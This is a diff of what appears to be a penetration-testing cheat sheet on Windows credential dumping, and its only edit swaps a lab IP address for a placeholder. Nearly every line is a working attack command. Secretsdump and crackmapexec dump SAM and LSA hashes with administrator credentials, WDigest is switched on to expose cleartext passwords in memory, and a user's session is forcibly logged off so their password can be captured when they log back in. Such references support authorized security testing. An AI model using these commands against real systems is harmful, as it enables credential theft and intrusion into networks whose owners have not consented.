@@ -22,19 +22,19 @@ secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
 crackmapexec smb $ip -d $domain -u $user -p $password --sam/--lsa
 
 # Dump local SAM hashes
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
+crackmapexec smb 192.168.215.x -u 'Administrator' -p 'PASS' --local-auth --sam
 
 CME
 Getting Credentials
 
 # Dump local SAM hashes
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
+crackmapexec smb 192.168.215.x -u 'Administrator' -p 'PASS' --local-auth --sam
 
 # Enable or disable WDigest to get credentials from the LSA Memory
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable
+crackmapexec smb 192.168.215.x -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
+crackmapexec smb 192.168.215.x -u 'Administrator' -p 'PASS' --local-auth --wdigest disable
 
 # Then you juste have to wait the user logoff and logon again
 # But you can force the logoff
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'
+crackmapexec smb 192.168.215.x -u 'Administrator' -p 'PASS' -x 'quser'
+crackmapexec smb 192.168.215.x -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'
